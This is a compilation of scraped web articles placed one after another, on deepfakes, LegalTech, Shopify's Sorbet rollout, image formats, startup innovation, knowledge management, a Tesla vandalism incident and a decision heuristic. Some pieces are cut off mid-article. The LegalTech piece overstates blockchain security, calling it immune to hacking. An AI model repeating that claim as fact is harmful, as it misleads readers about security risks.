<p>When deepfakes first gained popularity in 2017, they were overwhelmingly used in internet forums to generate fake pornography of celebrities. Even in 2019, 96% of all publicly posted deepfakes were pornographic, according to a <a href="https://sensity.ai/mapping-the-deepfake-landscape/">survey</a> done by the company <a href="https://sensity.ai/about/">sensity</a>. The targets of deepfakes (the people who have their faces swapped into deepfakes) are generally people who work in the entertainment industry.</p>

</figure>

<h3 id="deepfakes-in-media">Deepfakes in Media</h3>

<p>Aside from pornography, various online creators have been applying deepfakes to other forms of media, namely movie clips; individuals are constantly producing viral videos face swapping actors of movies with other actors. For example, in a recent YouTube video the faces of Arnold Schwarzenegger and Silvester Stalone were added to the movie Step Brothers <sup id="fnref:11" role="doc-noteref"><a href="#fn:11">9</a></sup>.</p>

<figure>

    <figcaption>Deepfake of Arnold Schwarzenegger and Silvester Stallone in the movie Step Brothers <a href="https://www.youtube.com/watch?v=uXwmSFjlVc0">(source)</a></figcaption>
</figure>

<p>While such videos suggest deepfakes could prove to be useful for the entertainment industry, most of these viral videos have just been short demonstrations, and there has yet to be a major Hollywood production to utilize deepfakes. Though, some might say that Hollywood should already be using deepfakes. Netflix received a lot of criticism for the quality of the de-aging effect that was used in the movie “The Irishman”. In response, someone <a href="https://www.creativebloq.com/news/the-irishman-deepfake">applied a de-aging deepfake to the movie and got impressive results</a>; perhaps it’s only a matter of time until Hollywood productions use these tools directly.</p>

<p>While no large blockbusters have used deepfakes, there are some accounts of smaller productions experimenting with deepfakes. Most notably, a producer has used deepfakes in his <a href="https://www.nytimes.com/2020/07/01/movies/deepfakes-documentary-welcome-to-chechnya.html">documentary about gay and lesbian persecution in Chechnya, to disguse the identities of the people being interviewed</a>.</p>

<p>As the examples above demonstrate, besides the possible negative uses of deepfakes, they can also lead to new possibilities when it comes to the entertainment industry. For instance, it could be really cool to be able to select which actor you want to watch in a movie. And, comedy impersonations like on Saturday Night Live will no doubt also reach a whole new level with deepfakes. In fact, just the other week, the creators of South park, Trey Parker and Matt Stone, started a new comedy series on YouTube called “Sassy Justice” centered around using deepfakes for celebrity impersonations. If you’re a fan of South Park you should definitely check it out:</p>

<h3 id="deepfakes-in-politics">Deepfakes in Politics</h3>

<p>Whenever a deepfake video gains attention online, there are always numerous comments from people expressing their concerns about using deepfakes to influence politics for nefarious purposes. These concerns are definitely valid, since in the information age being able to flood the internet with fake media about your political opponents that can fool viewers eyes and ears could be disastrous. To date, there have been quite a few deepfakes made addressing politics, many of which are satirical. One of the most popular was made by Jordan Peele where he reenacted Obama’s face <sup id="fnref:12" role="doc-noteref"><a href="#fn:12">10</a></sup>. This was not done maliciously, but rather to raise awareness of the potential that deepfakes have to shape the political landscape.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Legal Technology, or LegalTech, is the employment of technology and software to assist the legal&nbsp; profession with day-to-day operations, primarily to increase efficiency and save time. Most of the work of legal professionals, even when it comes to litigation, is clerical and repetitive.</p><p>To give legal professionals more time and space to put their minds to pressing matters which require human instinct and discernment, automated systems are being increasingly implemented. In recent years, the LegalTech industry has boomed with growing interest in the use of technology in all things legal.</p><p>The following major advancements have contributed to the further digitalization of the legal profession:<br></p><p><strong>Artificial intelligence (AI)</strong> is the ability of a computer or a robot controlled by a computer to do tasks that are usually done by humans that require human intelligence and judgment. In the legal industry, the use of AI has become quite significant over the years in Legal Research, Due Diligence, Contract Review, Risk Analysis and Legal Outcome Prediction.<br></p><p><strong>AI applications: </strong>AI has been simplifying research for legal professionals for years now with the help of research databases such as WestLaw and LexisNexis. AI-powered tools¹ can review documents and flag them as pertinent to a case, and once a certain type of document is identified as relevant, machine learning algorithms find other documents that are similarly relevant. Moreover, AI makes contract review more efficient by highlighting the most significant clauses of a contract, thus saving time that would otherwise be spent reading lengthy and arduous contracts. AI also helps identify contractual risks that could have negative repercussions for clients. AI can redline items, revise contracts, counsel clients on whether they should sign a contract or not, and can even help clients negotiate better terms.&nbsp;<br></p><p>AI also significantly contributes to the procurement of client background information for the purpose of due diligence. Additionally, it also helps in predicting the outcomes of legal proceedings, for which it applies² natural-language processing to a multitude of court decisions to locate trends that can be used to a client’s advantage. Thus, the use of AI in the legal sector is increasing manifold and can soon replace human involvement, thereby enabling more human attention to critical legal tasks.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f2c641d738317342c81b2b8/5fb6d86d41842fad0c48b3af_pexels-julia-m-cameron-4145190.jpg" loading="lazy" alt=""></p></figure><p><strong>E-billing:</strong> With law firms serving hundreds of clients, invoicing becomes a very strenuous task. E-billing³ is the automation of the review and approval of invoices received by the legal department of a firm. Legal e-billing systems enable legal teams to make rules on the basis of which incoming invoices are automatically reviewed, approved and rejected, thereby saving human effort and time while also removing the possibility of human error. Thus, not only is it a simpler record keeping software, in addition to simplifying record keeping, e-billing can also be used to identify cost-cutting measures and data-driven financial strategies. It is the ultimate win-win scenario; who doesn’t like to do less work and still earn profit?<br></p><p><strong>Blockchain and Smart Contracts:</strong> Arising as one of the finest developments in the world of algorithms in the later half of this past decade, blockchain is a transparent system whereby information is recorded, duplicated and distributed across an entire distributed network of computer systems. One application of blockchain that excites the legal profession is smart contracts. Smart contracts are basically terms of an agreement written into computational code in such a way that it is devoid of ambiguity and has no need for interpretation. Smart contract code is automatically executed and validated using cutting-edge cryptographic technology, and truly decentralized blockchains also provide protected systems⁴ immune to hacking, forgery, or post-deployment editing. Blockchains enable legal professionals to write and deploy smart contracts that can not be edited after publication by malicious actors and that will function as intended without administration by a third-party authority. All legal professionals should consider investing in this level of security and trustless reliability.<br></p><p><strong>E-courts</strong> are systems whereby court documents, right from filing complaints and evidence to the delivery of justice, are administered online. Even though <strong>E-filing</strong> is not a recent development, the COVID-19 pandemic has definitely increased its importance in the functioning of courts and the entire legal system.&nbsp;</p><p>Many courts that have switched to electronic filing also have an electronic docket system. This system allows users to browse through all filed documents quickly and efficiently. File collections that used to take up entire rooms can now be managed entirely electronically. Thus, it is a cost-cutting and time-saving mechanism for both parties and the courts, and further ensures speedy delivery of justice.<br></p><p><strong>Cloud computing:</strong> is another jewel in the LegalTech crown.&nbsp; Cloud computing technologies⁵ have been in use since the 1950s, but lately they have been adopted and assimilated into the operations of law firms. Cloud computing provides mobility and work space independence to professionals and can also be cost-friendly; however, it provides a lot of ethical dilemmas and issues regarding data breaches and security, due to potential lack of control of what personnel can access sensitive data. Hence, data protection, access control, and security comprise yet another domain that law firms have begun investing into heavily. Information being the new currency of the 21st century, cloud computing and data protection form the backbone of modern legal services.<br></p><p><strong>LegalTech startups:</strong> In recent years, LegalTech startups have been capitalizing on the demand for development of technology compatible with the legal sector. Some legal startups develop AI based software that contribute to cost-efficient and time-saving legal processes, thereby reducing the burden on managers, lawyers and litigants. LegalTech is a very promising and ever-evolving field, with lots of avenues yet unexplored and endless possibilities as technology is only bound to get better.&nbsp;<br></p><p><strong>COVID and its effect on the LegalTech sector:</strong> Owing to the COVID-19 pandemic, the prevalence and application of LegalTech has become all the more important in modern times, and it&nbsp; will completely revolutionize the traditional operations of the legal industry.</p><p>Although LegalTech appears to be quite an attractive and exciting field, one must not forget that technology is but a means to an end, the end here being justice and societal betterment, something which cannot be completely devoid of human touch.</p><h4>‍</h4><p>‍</p><p>‍</p><h4><em>References</em></h4><p>¹ Bernard Marr, How AI And Machine Learning Are Transforming Law Firms And The Legal Sector, May 23, 2018,&nbsp;<a href="https://www.forbes.com/sites/bernardmarr/2018/05/23/how-ai-and-machine-learning-are-transforming-law-firms-and-the-legal-sector/#67d853ac32c3"> https://www.forbes.com/sites/bernardmarr/2018/05/23/how-ai-and-machine-learning-are-transforming-law-firms-and-the-legal-sector/#67d853ac32c3</a><br></p><p>² Jason Koebler, Rise of the Robolawyers, April 2017, <a href="https://www.theatlantic.com/magazine/archive/2017/04/rise-of-the-robolawyers/517794/">https://www.theatlantic.com/magazine/archive/2017/04/rise-of-the-robolawyers/517794/</a><br></p><p>³ What is Legal E-Billing?, <a href="https://www.busylamp.com/what-is-legal-e-billing/">https://www.busylamp.com/what-is-legal-e-billing/</a><br></p><p>⁴ Cameron Haden, How Blockchain Could Affect Your Legal Career, <a href="https://www.thelawyerportal.com/blog/how-blockchain-affects-your-legal-career/">https://www.thelawyerportal.com/blog/how-blockchain-affects-your-legal-career/</a></p><p>⁵ Cloud Computing for the Legal Profession: Challenges and Opportunities, <a href="https://theknowledgereview.com/cloud-computing-legal-profession-challenges-opportunities/">https://theknowledgereview.com/cloud-computing-legal-profession-challenges-opportunities/</a><br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p><em><strong>Join us November 25, 2020 at 1 pm EST for ShipIt! Presents: The State of Ruby Static Typing at Shopify as we talk about static typing at Shopify. We’ll share why we chose Sorbet for the monolith and the lessons we learned along the way the&nbsp;way. <a href="#ShipIt">Please Register</a>.</strong></em></p>
<p>Shopify changes a lot. We merge around 400 commits to the main branch daily and deploy a new version of our core monolith 40 times a day. The Monolith is also big: 37,000 Ruby files, 622,000 methods, more than 2,000,000 calls. At this scale with a dynamic language, even with the most rigorous review process and over 150,000 automated tests, it’s a challenge to ensure everything&nbsp;runs smoothly. Developers benefit from a short feedback loop to ensure the stability of our monolith for our merchants.</p>
<p>Since 2018, our Ruby Infrastructure team has looked at ways to make the development process safer, faster, and more enjoyable for Ruby developers. While Ruby is different from other languages and brings amazing features allowing Shopify to be what it is today, we felt there was a feature from other languages missing: <strong>static typing</strong>.</p>

<p>Even in 2018, typing for Ruby wasn't a novelty. A few attempts were made to integrate type annotations directly into the language or through external tools (RDL, Steep), or as libraries (dry-types).&nbsp;</p>
<p>Which solution would best fit Shopify considering its codebase and culture? For the Ruby Infrastructure team, the best match for a typing solution needs:</p>
<ul>
<li>
<strong>Gradual typing: </strong>Typing a monolith isn't a simple task and can’t be done in a day. Our code evolves fast, and we can’t ask developers to stop coding while we add types to the existing codebase. We need flexibility to add types without blocking the development process or limiting our ability to satisfy merchants needs.</li>
<li>
<strong>Speed</strong>: Considering the size of Shopify’s codebase, speed is a concern. If our goal is to provide quick feedback on errors and remove pressure from continuous integration (CI), we need a solution that’s fast.</li>
<li>
<strong>Full Ruby support</strong>: We use all of Ruby at Shopify. Our culture embraces the language and benefits from all features, even hard to type ones like metaprogramming, overloading, and class reopening. Support for Rails is also a must. From code elegance to developer happiness, the chosen solution needs to be compatible as much as possible with all Ruby features.</li>
</ul>
<p>With such a list of requirements, none of the contenders at the time could satisfy our needs, especially the speed requirement. We started thinking about developing our own solution, but a perfectly timed meeting with Stripe, who were working on a solution to the problem, introduced us to <a href="https://sorbet.org/" target="_blank" title="Sorbet is a fast, powerful type checker designed for Ruby" rel="nofollow noopener noreferrer">Sorbet</a>.</p>
<p>Sorbet was closed-source at the time and under heavy development but was already promising. It’s built for gradual typing with phenomenal performance (able to analyze 100,000 lines per second per core) making it significantly faster than running automated tests. It can handle hard to type things like metaprogramming, thanks to Ruby Interface files (RBI). This is how, at the start of 2019, Shopify began its journey toward static type checking for Ruby.</p>

<p>With only a three-person team and a lot on our plate, fully typing our monolith with Sorbet was going to be an approach based on Shopify’s <a href="https://vimeo.com/456735890" target="_blank" title="Shopify - How we Get Shit Done" rel="nofollow noopener noreferrer">Get Shit Done (GSD) framework</a>.</p>
<ol>
<li>We tested the viability of Sorbet on our core monolith by only typing a few files, to check if we could observe benefits from it while not impairing other developers’ work. Sorbets’ gradual approach proved to be working.</li>
<li>We manually created RBI files to represent what Sorbet could not understand yet. We checked we supported Ruby’s most advanced features as well as Rails constructs.</li>
<li>We added more and more files while keeping an eye on performance ensuring Sorbet would scale with our monolith.</li>
</ol>
<p>This gave us confidence Sorbet was the right choice to solve our problem. Once we officially decided to go with Sorbet we reflected on how we can reach 100% adoption in the monolith. To determine our roadmap we looked at:</p>
<ul>
<li>how many files needed to be typed</li>
<li>the content of the files</li>
<li>the Ruby features they used.</li>
</ul>

<p>Type checking in Sorbet comes in different levels of strictness. The strictness is defined on a per file basis by adding a magic comment in the file, called a <em>sigil</em>, written <code># typed: LEVEL</code>, where <code>LEVEL</code> can be one of the following:&nbsp;</p>
<ul>
<li>
<strong>ignore</strong>: At this level, the file is not even read by Sorbet, and no errors are reported for this file at all.</li>
<li>
<strong>false</strong>: Only errors related to syntax, constant resolution and correctness of sigs are reported. At this level sorbet doesn’t check the calls in the files even if the methods called don't exist anywhere in the codebase.</li>
<li>
<strong>true</strong>: This is the level where Sorbet actually starts to type check your code. All methods called need to exist in the code base. For each call, Sorbet will check that the arguments count matches the method definition. If the method has a signature, Sorbet will also check their types.</li>
<li>
<strong>strict</strong>: At this level all methods must have a signature, and all constants and instance variables must have explicitly annotated types.</li>
<li>
<strong>strong</strong>: Sorbet no longer allows untyped variables. In practice, this level is actually unusable for most files because Sorbet can’t type everything yet and even Stripe advises against using it.</li>
</ul>
<p>Once we were able to run Sorbet on our codebase, we needed a way to track our progress and identify which parts of our monolith were typed with which strictness or which parts needed more work. To do so we created SorbetMetrics, a tool able to collect and display metrics about typing coverage for all our internal projects. We started tracking three key metrics to measure Sorbet adoption :</p>
<ul>
<li>
<strong>Sigils</strong>: how many files are typed <code>ignore</code>, <code>false</code>, <code>true</code>, <code>strict</code> or <code>strong</code>
</li>
<li>
<strong>Calls</strong>: how many calls are sent to a method with a signature</li>
<li>
<strong>Signatures</strong>: how many methods have a signature</li>
</ul>
<p><img alt="Bar graph showing increased Sorbet usage in projects over time. Below the bar graph is a table showing the percentage of sigils, calls, signatures in each project." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/sorbet-dashboard_ef9747c0-3326-4b45-bbe9-59a1680718f2.jpg?v=1605798789" src="https://cdn.shopify.com/s/files/1/0779/4361/files/sorbet-dashboard_ef9747c0-3326-4b45-bbe9-59a1680718f2.jpg?v=1605798789"><br><em>SorbetMetrics dashboard homepage</em></p>
<p>Each day SorbetMetrics pulls the latest version of our monolith and other Shopify projects using Sorbet, computes those metrics and displays them in a dashboard internally available to all our developers.</p>

<p>If we treat typing as a product, we also need to focus on supporting and enabling our “customers” who are developers at Shopify. One of our goals was to have a strong support system in place to help with any problems that arise and slow developers down.</p>
<p>Initially, we supported developers with a dedicated Slack channel where Shopifolk could ask questions to the team. We’d answer these questions real-time and help Shopifolk with typing efforts where our input was important.</p>
<p>This white glove support model obviously didn't scale, but it was an excellent learning opportunity for our team—we now understood the biggest challenges and recurring problems. We ended up solving some problems over and over again, but it solidified the effort to understand the patterns and decide which features to work on next.</p>
<p>Using Slack meant our answers weren't discoverable forever. We moved most of the support and conversation to our internal Discourse platform, increasing discoverability and broader sharing of knowledge. This also allows us to record solutions in a single place and let developers self-serve as much as possible. As we onboard more and more projects with Sorbet, this solution scales better.</p>

<p>Going further from unblocking our users, we also need to ensure their happiness. Sorbet and more generally static typing in Ruby wouldn’t be a good fit for us if it made our developers miserable. We’re aware that it introduces a bit more work, so the benefits need to balance with the inconvenience.</p>
<p>Our first tool to measure developers’ opinions of Sorbet is surveys. Twice a year, we send a “Typing @ Shopify” survey to all developers and collect their sentiments regarding Sorbet’s benefits and limitations, as well as what we should focus on in the future.</p>
<p><img alt="A bar graph showing the increasing strongly agree answer over time to the question I want Sorbet to be applied to other Shopify projects. Below that graph is a bar graph showing the increasing strongly agree answer over time to the question I want more code to be typed." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Sobert-at-Shopify-Survey-Results-1.jpg?v=1605764198" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Sobert-at-Shopify-Survey-Results-1.jpg?v=1605764198"><br><em>Some responses&nbsp;from our “Sorbet @ Shopify” surveys</em></p>
<p>We use simple questions (“yes” or “no”, or a “Strongly Disagree” (1) to “Strongly Agree” (5) scale) and then look at how the answers evolve over time. The&nbsp;survey results gave us&nbsp;interesting insights:</p>
<ul>
<li>Sorbet catches more errors on developer’s pull requests (PR) as adoption increased</li>
<li>Signatures help with code understanding and give developers confidence to ship</li>
<li>Added&nbsp;confidence&nbsp;directly impacted&nbsp;the increasing positive opinion about static typing in Ruby</li>
<li>Over time developers&nbsp;wanted more code and more projects to be typed</li>
<li>Developers get used to Sorbet syntax over time</li>
<li>IDE integration with Sorbet is a feature developers are rooting for</li>
</ul>
<p>Our main observation is that developers enjoy Sorbet more as the typing coverage increases. This is one reason that's increasing our motivation to reach 100% of files at <code>typed: true</code> and maximize the amount of methods with a signature.</p>
<p>The second tool is interviews with individual developers. We select a team working with Sorbet and meet each member to talk about their experience using Sorbet either in the monolith or on another project. We get a better understanding of what their likes and dislikes are, what we should be improving, but also how we can better support them when introducing Sorbet, so the team keeps Sorbet in their project.</p>

<p>Currently, Sorbet is only enforced on our main monolith and we have about 60 other internal projects that opted to use Sorbet as well. On our main monolith, we require all files to be at least <code>typed: false</code> and Sorbet is run on our continuous integration platform (CI) for every PR and fails builds if type checking errors are found. We’re currently evaluating the idea of enforcing valid type checking on CI even before running the automated tests.</p>
<p><img alt="Three pie charts showing percentage of sigils, calls, and signatures in the monolith used to measure Sorbet adoption" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Typing-Coverage-Shopify-Monolith.jpg?v=1605764949" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Typing-Coverage-Shopify-Monolith.jpg?v=1605764949"><br><em>Typing coverage metrics for Shopify’s monolith</em></p>
<p>As of today, 80% of our files (including tests) are <code>typed: true</code> or higher. Almost half of our calls are typed and half of our methods have signatures. All of this can be type checked under 15 seconds on our developers machines.</p>

November 20, 2020 | https://codecs.multimedia.cx/2020/11/an-upcoming-image-format-war/ | <a href="https://web.archive.org/web/*/https://codecs.multimedia.cx/2020/11/an-upcoming-image-format-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>So this week <code>libwebp2</code> appeared in a public repository. From a quick glance it looks like lossy format is based on AV1 coding blocks and lossless format is largely the same as the original WebP lossless but both now use ANS coding. And (of course) there’s a hint on experimental lossy encoding using neural networks.</p>
<p>Let’s pretend that JPEG has finally died (again) and GIF and PNG are both gone. So what modern image formats intended for general audience are out there?</p>
<p>Of course there’s Nokia HEIF which is picture(s) split into tiles, coded with H.EVC and stored in MP4. Because of the wonderful patent situation around it probably it won’t be used outside iEcosystem.</p>
<p>AVIF—same container, different codec (AV1 in this case).</p>
<p>WebP/WebP2—Baidu image format with lossy compression based on Baidu VPx codec (VP8 or VP10) and lossless compression from the French division of Baidu.</p>
<p>JPEG XL—a joint project between Cloudinary and Swiss division of Baidu responsible for Baidu Chrömli (in case you did not know that’s a Swiss word for various small sweets bits like Guetsli, Brunsli and such; Brötli/Gipfeli/Zöpfli/Grittibänzli are related to bread though, especially Brötli). Anyway, that’s a different format with different set of features that include lossless JPEG recompression (and hopefully the best practical lossless image compression as one would expect from creators of FLIF).</p>
<p>So my point is if you’d have to choose between all those formats essentially you have to pick some format from Baidu (either directly from it or using its codec). Somehow this future does not excite me much so I’d rather stick to old formats for which a single programmer can write a standalone decoder in reasonable time.</p>
<p>Also for some reason this reminds me of Soviet space program where there were three main construction centres (led by Korolyov, Chelomey and Yangel) producing different missiles and spaceships many of those are still in use. But the competition was also hurtful for the general progress. As you remember there were three heavy spaceships proposed by neither of them was really successful: Korolyov’s N1 had failures because of the engines, Yangel’s R-56 was cancelled early in favour of N1, Chelomey’s UR-700 has never been realized either, Glushko’s Energia had two launches (both successful) but it was too late and there was no payload for it beside equally successful Buran program. So on one hand you have variety and on the other hand you have a lot of wasted resources and efforts.</p>
<p>I see parallels here and with AV1 as well. Why the company controlling <code>libaom</code> would develop <code>libgav1</code> too?</p>
<p>And while speaking about AV1 I should mention that it reminds me of another kind of project, namely Olympic games.</p>
<p>Originally the Olympics were competition between various people from various city-states for both religious and entertainment reasons. Later they were resurrected as a mean to promote sports and unity, but just a couple decades later the games became more of a political instrument promoting national teams instead of being just a competition of individuals from various places (partly because all the training becomes too costly for a non-professional sportsman, partly because countries want the prestige). And a bit later it became a business project that 2004 Summer games in Athens demonstrated the best.</p>
<p>So you have a committee that holds the rights to the symbols, logos, mascots and everything else. The receiving party has to build large infrastructure to host various competitions and hope that the guests will bring enough money to compensate at least some of those costs (and maybe those buildings would be useful later but quite often they are not). Various companies pay a lot of money to become sponsors in hope that such status will work as effective advertisement, broadcasting companies pay a lot of money for broadcasting rights in hope of getting more viewers (and money from ads). So before the games a lot of parties pay a lot of money and afterwards they might make profit or not. And the host country is left with huge expenses for constructing stadiums and such—and those rather useless constructions that are too big for regular events or training. And of course the prestige. Where money go to and which Olympics were profitable to the host country is left as an exercise to the reader.</p>
<p>In a similar way AV1 feels like such project: it drew resources from different companies and people from different opensource multimedia projects to build something huge that is not really useful (I know that in theory it should trade bandwidth for CPU heat but how many customers will be AV1 ready before AV2 is released and the cycle repeats?) and people involved in <code>libaom</code>, <code>svt-av1</code>, <code>dav1d</code> and <code>rav1e</code> would better be doing something else including better multimedia frameworks (I work on <code>NihAV</code> mostly because the alternatives are even worse) or new codecs or even on a decent video editor so people making videos for BaidUTube won’t have to rely on expensive proprietary solutions that tend to crash anyway or suspicious Chinese or Russian programs that rip off opensource libraries (I’ve seen one using <code>mencoder</code> compiled as a <code>.dll</code>).</p>
<p>Anyway, like the Olympics were intended to promote sport and healthy living but became business projects that are financial loss to the most parties, AV1 looks like a project that also while being positioned as the saviour of opensource multimedia essentially benefits just a small group of organisations. And as with many other things I say I’d be happy to be proven wrong.</p>
<p>P.S. In case you say that I’m inconsistent and dislike both competing groups inside one company and uniting efforts (for the sake of the same company). Well, I’d prefer different entities (companies or opensource projects or whatever) to produce single solution each while there’s more than just one entity doing it. To return to space analogies, I’d rather see many private companies developing an own line of spaceships each (for various purposes too) instead of ULA producing several kinds of radically different spaceships without any outside competition.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><img src="https://www.philipotoole.com/wp-content/uploads/2015/09/robot-150x150.png" alt="" width="150" height="150">There is a popular image out there, among the general public, that small startups — particularly small software startups — are a hotbed of technical innovation, constantly creating new technology. But is it true?</p>

<p>Of course, to a certain extent it is true. But in my experience <em>startups are disproportionately innovating when it comes to business models</em>, and <em>creating new ways to hold onto their customers</em>. High-level technical innovation is mostly happening at large companies.</p>
<p>Looking back at the last 10 years, it’s surprising how much of <a href="https://www.philipotoole.com/resume/">my career</a> has been based on technologies that were actually developed at very large firms.</p>
<h2>The reality</h2>
<p>My first example is <a href="https://www.loggly.com/" target="_blank" rel="noopener noreferrer">Loggly</a>. At Loggly we were one of the first (if not the first) teams to put <a href="https://kafka.apache.org/" target="_blank" rel="noopener noreferrer">Apache Kafka</a> in front of <a href="https://www.elastic.co/elasticsearch/" target="_blank" rel="noopener noreferrer">Elasticsearch</a>, and <a href="https://www.youtube.com/watch?v=LpNbjXFPyZ0&amp;feature=emb_logo" target="_blank" rel="noopener noreferrer">build a product out of it</a>. But Apache Kafka was developed at <a href="https://www.linkedin.com/" target="_blank" rel="noopener noreferrer">LinkedIn</a>, after it had become a large firm.</p>
<p>Next is <a href="https://www.influxdata.com/" target="_blank" rel="noopener noreferrer">InfluxDB</a>. <a href="https://www.influxdata.com/blog/influxdb-1-0-ga-released-a-retrospective-and-whats-next/" target="_blank" rel="noopener noreferrer">During my time there</a> we created the TSM storage engine, but <a href="https://docs.influxdata.com/influxdb/v1.8/concepts/storage_engine/" target="_blank" rel="noopener noreferrer">key parts of that engine were based on the Gorilla storage engine</a>, which came out of <a href="https://www.facebook.com/" target="_blank" rel="noopener noreferrer">Facebook</a>.</p>
<p>Elasticsearch is interesting example. It was a small company, and it created a Search product of global importance. But it, in turn was built on <a href="https://lucene.apache.org/" target="_blank" rel="noopener noreferrer">Apache Lucene</a>, which was developed by <a href="https://en.wikipedia.org/wiki/Doug_Cutting" target="_blank" rel="noopener noreferrer">Doug Cutting</a> after his experience at <a href="https://www.parc.com/" target="_blank" rel="noopener noreferrer">Xerox PARC</a> and <a href="https://www.apple.com/" target="_blank" rel="noopener noreferrer">Apple</a>.</p>
<p>So the image of small software startups making groundbreaking technical advancements is not quite as common as we think.</p>
<p>At Loggly we had the <em>freemium</em> model — the idea that you give part of your software away for free, and hope people will upgrade to the premium versions. We were constantly tweaking that business model — <em>that was innovation right there</em>, but we never thought of it as such.</p>
<h2>The lesson?</h2>
<p>When it comes to evaluating an company, and its potential success, there may be a lesson here. Perhaps the company that has built brand new software from end-to-end is not going to be as successful as that company that has taken existing software, <em>and combined it with innovative business models</em>.</p>

<p>I’ve been thinking a lot about corporate knowledge management systems recently.</p>



<p>If we think about a company as an organism, then a knowledge management system is essentially the (collective) brain that keeps that organism alive and running. A corporate knowledge management system should contain every single bit of codifiable information within the company resulting in a library of all projects, processes and procedures.</p>



<p>In an ideal state, it is the single source of truth that helps to inform every individual in the firm about what everyone else is up to. Information should be easy to add (input) as well as easy to search and find (output) resulting in quick knowledge transfer between different employees.</p>



<p>In reality, however, this hardly ever is the case. As anyone who has ever worked at a larger company can attest to, company knowledge bases always end up being a huge mess. </p>



<p>What starts with a neatly organized Confluence wiki, over time morphs into a multi-headed monster consisting of millions of notes and documents that live across Google Docs, Dropbox Paper, Asana and half a dozen different wiki tools. Most docs will be outdated, some will contradict others and the one you are really looking for only shows up on page 14 of your search results.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/monster-4.png"></p><p>It seems like things usually start to fall apart once a company surpasses the <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar number</a> of 150 employees. This is probably when people start to realize that all the different documents of <em>explicit knowledge</em> they were amassing over the years have been held together with <em>implicit knowledge</em>. </p>



<p>It’s easy to find – and understand – the right documents when you know every other person in the company, but once you’re past that point, you need a system to organize all the data so that people can make sense of it.</p>



<p>The idea behind tools like Notion is to solve this problem by using just one tool for all your different knowledge documents. Instead of Google Docs AND Asana AND Trello AND Airtable, you just do everything in Notion. This reduces complexity because you don’t have to switch and search across different apps. At the same time, Notion forces you to think about a system that makes information easy to find with its folder-like structure and links between different databases.</p>



<p>I’ve never used Notion with more than half a dozen people myself, but from what I’ve heard from people at larger companies, Notion knowledge bases also don’t scale very well beyond a certain number of users. Once too many people start contributing to it, things become bloated and unnavigable.</p>



<p>A friend at Stripe recently suggested – half-jokingly – that we should hire a librarian to organize all our internal data and documentation. The more I think about it, the more I like the idea. Perhaps every company should hire a Chief Notion Officer once it hits 100 employees?!</p>



<p>An alternative approach to Notion is a knowledge management system that can live across different tools and without active manual curation because it’s based on really powerful search. The folder structure of your Google Drive, for example, doesn’t <em>really</em> matter because looking up documents via search is faster and more convenient. Meta search tools like <a href="https://usefyi.com/">FYI</a> are supposed to offer the same but across different productivity tools.</p>



<p>But again I’m skeptical that this really works beyond a certain amount of users (and thus documents). I remember even Google’s internal search engine doing only a mediocre job of surfacing the most relevant documents (and even if it did you weren’t sure if there wasn’t a better or more up-to-date version of it).</p>



<p>I’m sure we’ll get there eventually, but until then we probably need a mix of automated search and manual human help – which is where Slack comes in. I’ve <a href="https://twitter.com/lehrjulian/status/1097940802737704960">always thought</a> Slack plus Notion plus <a href="https://www.atspoke.com/">Spoke</a> would make a really powerful product (and I’m surprised Slack hasn’t made any major acquisitions in this space).</p>



<p>If you think about it, Slack is basically a search engine powered by humans: Most Slack messages are just questions. <a href="https://kwokchain.com/2019/08/16/the-arc-of-collaboration/">It’s 911 for when everything else fails</a>. So if Slack had access to your entire knowledge base, it could answer at least the most commonly asked questions automatically. The rest would still get answered manually by the channel participants. Or your Chief Notion Officer.</p>

<p>This is probably the most vicious attack on a Tesla we have ever witnessed. A man from London, Ontario, Canada saw a lonely <a href="https://www.teslaoracle.com/topic/model-3/">Tesla Model 3</a> in a parking lot at night and no one is sure what motivated him to hit the car with a concrete brick. </p>



<p>Unaware of the technology in Teslas, this goon never knew the car’s <a href="https://www.teslaoracle.com/tag/sentry-mode/">Sentry Mode</a> cameras were recording him during the entire course of his vandalism.</p>



<p>This incident took place on the 29th of October, 2020 at 5:57 AM according to the car’s owner. The damages have been estimated at $10,000 till now.</p>



<p>Here’s the short video clip from the right repeater camera which captured the actual action taking place.</p>

<p>Grabbing frames from the above footage, the Tesla owner posted the following two photos that show the stills of the vandal’s face from two different angles.</p>

<p>Tesla community members have come to help in identifying the person in the video by using AI face extrapolation and photo editing skills to get a clearer idea of the face of the vandal in this case.</p>

<p>Apparently, the cinder block was thrown at the car’s side window and doesn’t look like significant damage to the vehicle but the owner said that the block had also hit the B-pillar and above that damaged the body of the <a href="https://www.teslaoracle.com/topic/model-3/">Tesla Model 3</a>.</p>



<p>According to the owner of the damaged car, the side window glass is only $200 CAD but the real damage was done to the body of the car. The culprit also ferociously searched inside the car as well and damaged different parts in the process, making the total damage close to $10,000 CAD.</p>



<p>However, with this much visual proof, the insurance company should not have any problem knowing that the owner was not at fault.</p>

<p>In a Tesla vandalism <a href="https://www.xautoworld.com/news/police-after-tesla-vandals/">case from Sacramento, California last year</a>, two Tesla vandals turned themselves to the police after the Sentry Mode video went viral and it even aired on national television. Similarly, this guy from London, ON will not be able to hide for long, help spread the word, and videos.</p>



<p>Stay tuned for further updates on this case, we will post part 2 of this when the culprit gets caught. </p>

    <p>Some decisions we make lie in a spectrum, whether it’s how dirty a joke should be or how much can we mix the batter before we ruin the cake. In many of those decisions, the options have order to them. A joke can be more or less dirty. We can over or under mix batter.</p>
<p>A professional at the subject matter could pick the perfect spot in that spectrum. They know the cause-effect relation very well and have the high analytical know-how to determine what is approrpriate and when. However, there is a method for non-professionals to arrive at very good results with very little practice.</p>
<p>“Go to the extreme, then half way”.</p>
